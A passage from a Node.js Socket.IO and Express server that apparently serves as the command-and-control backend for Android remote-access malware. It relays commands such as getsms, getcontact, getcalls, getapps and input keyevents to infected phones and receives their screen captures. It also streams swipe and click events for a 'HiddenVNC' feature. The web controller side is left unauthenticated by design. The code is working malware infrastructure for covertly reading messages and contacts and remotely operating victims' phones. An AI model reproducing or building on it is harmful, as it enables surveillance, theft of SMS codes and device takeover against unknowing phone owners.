        imageLength: imageData ? imageData.length : 0,
        normalizedDataKeys: Object.keys(normalizedData),
        imageDataPreview: imageData ? imageData.substring(0, 10) : 'null',
        imageDataStartsWithSlash: imageData ? imageData.startsWith('/') : false
      });
      
      // Broadcast screen-result event to all web clients
      io.emit("device_event", {
        event: "screen_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: normalizedData,
      });
      
      console.log(`📤 Broadcasted screen_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [screen-result] Error processing data from ${uuid}:`, err.message);
      console.error(`❌ [screen-result] Error stack:`, err.stack);
    }
  });

  // -------- SWIPE DETECTION from device --------
  socket.on("swipe-detected", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated swipe-detected attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid swipe-detected data from ${uuid}`);
      return;
    }

    try {
      // Extract swipe information
      const {
        startX,
        startY,
        endX,
        endY,
        duration,
        direction, // left, right, up, down, diagonal
        distance,
        velocity
      } = data;

      // Calculate direction if not provided
      let calculatedDirection = direction;
      if (!calculatedDirection && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        const deltaX = endX - startX;
        const deltaY = endY - startY;
        const absDeltaX = Math.abs(deltaX);
        const absDeltaY = Math.abs(deltaY);

        if (absDeltaX > absDeltaY) {
          calculatedDirection = deltaX > 0 ? "right" : "left";
        } else {
          calculatedDirection = deltaY > 0 ? "down" : "up";
        }

        // Check for diagonal swipes
        if (absDeltaX > 0 && absDeltaY > 0) {
          const ratio = absDeltaX / absDeltaY;
          if (ratio > 0.5 && ratio < 2) {
            // Diagonal swipe
            if (deltaX > 0 && deltaY > 0) calculatedDirection = "down-right";
            else if (deltaX > 0 && deltaY < 0) calculatedDirection = "up-right";
            else if (deltaX < 0 && deltaY > 0) calculatedDirection = "down-left";
            else calculatedDirection = "up-left";
          }
        }
      }

      // Calculate distance if not provided
      let calculatedDistance = distance;
      if (!calculatedDistance && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        calculatedDistance = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));
      }

      const swipeData = {
        startX,
        startY,
        endX,
        endY,
        duration: duration || 0,
        direction: calculatedDirection || "unknown",
        distance: calculatedDistance || 0,
        velocity: velocity || (calculatedDistance && duration ? calculatedDistance / duration : 0),
        timestamp: new Date().toISOString(),
      };

      console.log(`👆 [swipe-detected] Swipe detected on ${uuid}:`, {
        direction: swipeData.direction,
        distance: Math.round(swipeData.distance),
        duration: swipeData.duration,
        from: `(${startX}, ${startY})`,
        to: `(${endX}, ${endY})`,
      });
      
      // Broadcast swipe-detected event to all web clients
      io.emit("device_event", {
        event: "swipe_detected",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: swipeData,
      });
      
      console.log(`📤 Broadcasted swipe_detected event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [swipe-detected] Error processing data from ${uuid}:`, err.message);
      console.error(`❌ [swipe-detected] Error stack:`, err.stack);
    }
  });

  // -------- GESTURE DETECTION from device (generic handler) --------
  socket.on("gesture-detected", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated gesture-detected attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid gesture-detected data from ${uuid}`);
      return;
    }

    try {
      console.log(`👆 [gesture-detected] Gesture detected on ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast gesture-detected event to all web clients
      io.emit("device_event", {
        event: "gesture_detected",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: {
          ...data,
          timestamp: new Date().toISOString(),
        },
      });
      
      console.log(`📤 Broadcasted gesture_detected event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [gesture-detected] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SWIPE DETECTION from web clients (HiddenVNC) --------
  socket.on("swipe-detected-web", (data) => {
    // Web clients can emit swipe-detected events when interacting with HiddenVNC
    if (!data || typeof data !== "object") {
      console.warn(`⚠️ Invalid swipe-detected-web data from ${socket.id}`);
      return;
    }

    const { deviceId, startX, startY, endX, endY, duration, direction, distance, velocity } = data;

    if (!deviceId || typeof deviceId !== "string") {
      console.warn(`⚠️ Missing deviceId in swipe-detected-web from ${socket.id}`);
      return;
    }

    try {
      // Calculate direction if not provided
      let calculatedDirection = direction;
      if (!calculatedDirection && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        const deltaX = endX - startX;
        const deltaY = endY - startY;
        const absDeltaX = Math.abs(deltaX);
        const absDeltaY = Math.abs(deltaY);

        if (absDeltaX > absDeltaY) {
          calculatedDirection = deltaX > 0 ? "right" : "left";
        } else {
          calculatedDirection = deltaY > 0 ? "down" : "up";
        }

        // Check for diagonal swipes
        if (absDeltaX > 0 && absDeltaY > 0) {
          const ratio = absDeltaX / absDeltaY;
          if (ratio > 0.5 && ratio < 2) {
            if (deltaX > 0 && deltaY > 0) calculatedDirection = "down-right";
            else if (deltaX > 0 && deltaY < 0) calculatedDirection = "up-right";
            else if (deltaX < 0 && deltaY > 0) calculatedDirection = "down-left";
            else calculatedDirection = "up-left";
          }
        }
      }

      // Calculate distance if not provided
      let calculatedDistance = distance;
      if (!calculatedDistance && startX !== undefined && startY !== undefined && endX !== undefined && endY !== undefined) {
        calculatedDistance = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));
      }

      const swipeData = {
        startX,
        startY,
        endX,
        endY,
        duration: duration || 0,
        direction: calculatedDirection || "unknown",
        distance: calculatedDistance || 0,
        velocity: velocity || (calculatedDistance && duration ? calculatedDistance / duration : 0),
        timestamp: new Date().toISOString(),
        source: "web_client", // Indicate this came from web client
      };

      console.log(`👆 [swipe-detected-web] Swipe detected on device ${deviceId} from web client:`, {
        direction: swipeData.direction,
        distance: Math.round(swipeData.distance),
        duration: swipeData.duration,
        from: `(${startX}, ${startY})`,
        to: `(${endX}, ${endY})`,
      });
      
      // Broadcast swipe-detected event to all web clients
      io.emit("device_event", {
        event: "swipe_detected",
        device_id: deviceId,
        timestamp: new Date().toISOString(),
        data: swipeData,
      });
      
      console.log(`📤 Broadcasted swipe_detected event for ${deviceId} (from web client)`);
    } catch (err) {
      console.error(`❌ [swipe-detected-web] Error processing data:`, err.message);
      console.error(`❌ [swipe-detected-web] Error stack:`, err.stack);
    }
  });

  // -------- CLICK DETECTION from web clients (HiddenVNC) --------
  socket.on("click-detected-web", (data) => {
    // Web clients can emit click-detected events when interacting with HiddenVNC
    if (!data || typeof data !== "object") {
      console.warn(`⚠️ Invalid click-detected-web data from ${socket.id}`);
      return;
    }

    const { deviceId, x, y, duration, timestamp } = data;

    if (!deviceId || typeof deviceId !== "string") {
      console.warn(`⚠️ Missing deviceId in click-detected-web from ${socket.id}`);
      return;
    }

    try {
      const clickData = {
        x: x || 0,
        y: y || 0,
        duration: duration || 0,
        timestamp: timestamp || new Date().toISOString(),
        source: "web_client", // Indicate this came from web client
      };

      console.log(`👆 [click-detected-web] Click detected on device ${deviceId} from web client:`, {
        at: `(${x}, ${y})`,
        duration,
      });
      
      // Broadcast click-detected event to all web clients
      io.emit("device_event", {
        event: "click_detected",
        device_id: deviceId,
        timestamp: new Date().toISOString(),
        data: clickData,
      });
      
      console.log(`📤 Broadcasted click_detected event for ${deviceId} (from web client)`);
    } catch (err) {
      console.error(`❌ [click-detected-web] Error processing data:`, err.message);
      console.error(`❌ [click-detected-web] Error stack:`, err.stack);
    }
  });

  // -------- WEB CLIENT COMMAND REQUESTS --------
  socket.on("send-command", (data) => {
    // Web clients don't need authentication, but validate the request
    if (!data || typeof data !== "object") {
      socket.emit("command-error", {
        error: "Invalid command data",
        deviceId: data?.deviceId || null,
        command: data?.command || null,
      });
      return;
    }

    const { deviceId, command, payload, param } = data;

    // Validate required fields
    if (!deviceId || typeof deviceId !== "string") {
      socket.emit("command-error", {
        error: "deviceId is required and must be a string",
        deviceId: null,
        command: command || null,
      });
      return;
    }

    if (!command || typeof command !== "string") {
      socket.emit("command-error", {
        error: "command is required and must be a string",
        deviceId,
        command: null,
      });
      return;
    }

    // Get the device client
    const deviceClient = clients.get(deviceId);

    if (!deviceClient) {
      socket.emit("command-error", {
        error: "Device not found or not connected",
        deviceId,
        isOnline: false,
      });
      return;
    }

    if (!deviceClient.socket || !deviceClient.socket.connected) {
      socket.emit("command-error", {
        error: "Device socket not connected",
        deviceId,
        isOnline: false,
      });
      return;
    }

    // Use command, param, and payload as-is (no conversion)
    const actualCommand = command;
    const actualParam = param;
    const actualPayload = payload || {};

    // Prepare the payload
    let cmdPayload;
    
    if (actualCommand === "access-command") {
      // For access-command, send only cmd, param, and data
      cmdPayload = {
        cmd: actualCommand,
        ...(actualParam && typeof actualParam === "string" && { param: actualParam }),
        ...(actualPayload && typeof actualPayload === "object" && { data: actualPayload })
      };
    } else {
      // For other commands, use the full logic
      cmdPayload = { 
        cmd: actualCommand,
        ...(actualPayload && typeof actualPayload === "object" && { data: actualPayload }),
        // Support param field for commands (CRITICAL for Android device input commands)
        ...(actualParam && typeof actualParam === "string" && { param: actualParam }),
        // Extract args array from payload.args and send directly (for getapps/getcontact/getcalls)
        ...(actualPayload && actualPayload.args && Array.isArray(actualPayload.args) && { args: actualPayload.args }),
        // Convert param to args for commands that expect args[0] (like getpreviewimg)
        ...(actualParam && typeof actualParam === "string" && actualCommand === "getpreviewimg" && { args: [actualParam] })
      };
    }

    // Ensure param is present for input commands
    if (actualCommand === "input" && !cmdPayload.param) {
      console.warn(`⚠️ [Device Server] Input command missing param, using default`);
      cmdPayload.param = actualParam || `keyevent 4`;
    }

    // Log args extraction for getapps command
    if (command === "getapps") {
      console.log(`📤 [getapps] Command received:`);
      console.log(`   Payload:`, payload);
      console.log(`   Args extracted:`, payload?.args);
      console.log(`   Args type:`, Array.isArray(payload?.args) ? "array" : typeof payload?.args);
      console.log(`   Args length:`, payload?.args?.length);
      if (Array.isArray(payload?.args)) {
        console.log(`   Args[0] (type):`, payload.args[0]);
        console.log(`   Args[1] (limit):`, payload.args[1]);
        console.log(`   Args[2] (offset):`, payload.args[2]);
      }
      console.log(`   Final cmdPayload:`, cmdPayload);
    }

    // Emit command to the device using the pattern "id-{uuid}"
    deviceClient.socket.emit(`id-${deviceId}`, cmdPayload);

    console.log(`📤 [Web Client] Sent command '${command}' to device ${deviceId}`);
    console.log(`   Button: ${payload?.button || actualPayload?.button || 'N/A'}`);
    console.log(`   Command: ${cmdPayload.cmd}`);
    console.log(`   Param: ${cmdPayload.param || 'None'}`);
    console.log(`   Full Payload:`, JSON.stringify(cmdPayload, null, 2));

    // Send success confirmation back to web client
    socket.emit("command-sent", {
      success: true,
      deviceId,
      command,
      message: `Command '${command}' sent to device ${deviceId}`,
      timestamp: new Date().toISOString(),
    });
  });

  // -------- DISCONNECT HANDLER --------
  socket.on("disconnect", () => {
    const uuid = socket.uuid;
    if (uuid && clients.has(uuid)) {
      console.log(`🔌 Device disconnected: ${uuid}`);
      const c = clients.get(uuid);
      deviceRegistry.set(uuid, { info: c.info, lastSeen: Date.now() });
      clients.delete(uuid);
      saveDevices();
    } else {
      console.log(`🔌 Web client disconnected: ${socket.id}`);
    }
  });
});

// -------------------- EXPRESS ROUTES --------------------
app.use(express.json());

// CORS middleware for all routes
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === "OPTIONS") {
    return res.sendStatus(200);
  }
  next();
});

app.get("/devices", (req, res) => {
  console.log(`📥 GET /devices - Request received`);
  
  const active = Array.from(clients.entries()).map(([uuid, c]) => ({
    uuid,
    isOnline: true,
    info: c.info,
  }));

  const offline = Array.from(deviceRegistry.entries())
    .filter(([uuid]) => !clients.has(uuid))
    .map(([uuid, d]) => ({
      uuid,
      isOnline: false,
      info: d.info,
      lastSeen: d.lastSeen,
    }));

  const allDevices = [...active, ...offline];
  console.log(`📤 GET /devices - Returning ${allDevices.length} devices (${active.length} online, ${offline.length} offline)`);

  res.json({ devices: allDevices });
});

// -------------------- Send Command via REST API --------------------
app.post("/api/command/:uuid", (req, res) => {
  const uuid = req.params.uuid;
  const { cmd, param } = req.body; // cmd like "getsms", param like "inbox|50|10"

  console.log(`📥 POST /api/command/${uuid} received`);
  console.log(`   Body:`, req.body);

  if (!cmd) {
    return res.status(400).json({ error: "Missing cmd" });
  }

  // Find the connected device
  const client = clients.get(uuid);
  if (!client) {
    return res.status(404).json({ error: "Device not connected", uuid });
  }

  // Prepare payload with cmd and optional param
  const payload = { cmd };
  if (param) {
    payload.param = param;
  }

  // Emit dynamically based on selected phone UUID
  client.socket.emit("id-" + uuid, payload);

  console.log(`📤 Sent command '${cmd}' to device ${uuid}`);
  console.log(`   Payload:`, payload);

  res.json({
    success: true,
    message: `Command '${cmd}' sent to device ${uuid}`,
    uuid,
    payload,
    timestamp: new Date().toISOString(),
  });
});

// Debug route to test if routes work
app.get("/api/test", (req, res) => {
  res.json({ message: "Routes are working!", timestamp: new Date().toISOString() });
});

// -------------------- SERVER START --------------------
const PORT = process.env.PORT || 9211;
server.listen(PORT, () => {
  console.log(`🚀 Server running at http://0.0.0.0:${PORT}`);
});
